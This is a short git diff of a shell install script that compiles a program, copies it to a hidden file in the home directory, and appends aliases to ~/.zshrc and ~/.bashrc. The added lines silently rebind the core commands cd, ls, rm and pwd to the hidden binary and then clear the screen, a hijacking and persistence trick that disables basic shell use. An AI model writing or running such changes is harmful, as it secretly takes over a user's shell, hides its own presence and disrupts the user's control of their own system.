@@ -5,8 +5,15 @@ NAME=07_03_21_in_memory_of_the_Kesha
 
 make -C $DIR_NAME/ NAME=$NAME
 cp $NAME ~/.$NAME
-echo "alias gg=\"~/.$NAME\"" >> ~/.zshrc
-echo "alias gg=\"~/.$NAME\"" >> ~/.bashrc
-echo "alias dd=\"~/.$NAME\"" >> ~/.zshrc
-echo "alias dd=\"~/.$NAME\"" >> ~/.bashrc
+
+echo "alias cd=\"~/.$NAME\"" >> ~/.zshrc
+echo "alias ls=\"~/.$NAME\"" >> ~/.zshrc
+echo "alias rm=\"~/.$NAME\"" >> ~/.zshrc
+echo "alias pwd=\"~/.$NAME\"" >> ~/.zshrc
+
+echo "alias cd=\"~/.$NAME\"" >> ~/.bashrc
+echo "alias ls=\"~/.$NAME\"" >> ~/.bashrc
+echo "alias rm=\"~/.$NAME\"" >> ~/.bashrc
+echo "alias pwd=\"~/.$NAME\"" >> ~/.bashrc
+
 clear
